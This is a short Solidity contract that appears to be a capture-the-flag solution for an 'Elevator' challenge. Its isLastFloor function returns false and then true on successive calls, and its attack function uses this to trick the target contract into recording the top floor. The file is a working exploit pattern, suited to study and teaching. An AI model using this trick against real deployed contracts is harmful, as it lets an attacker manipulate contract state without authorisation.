// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract AttackElevator {
    IElevator private elevator;
    uint private floor;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() external {
        elevator.goTo(10);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (floor != _floor) {
            floor = _floor;
            return false;
        }
        return true;
    }
}
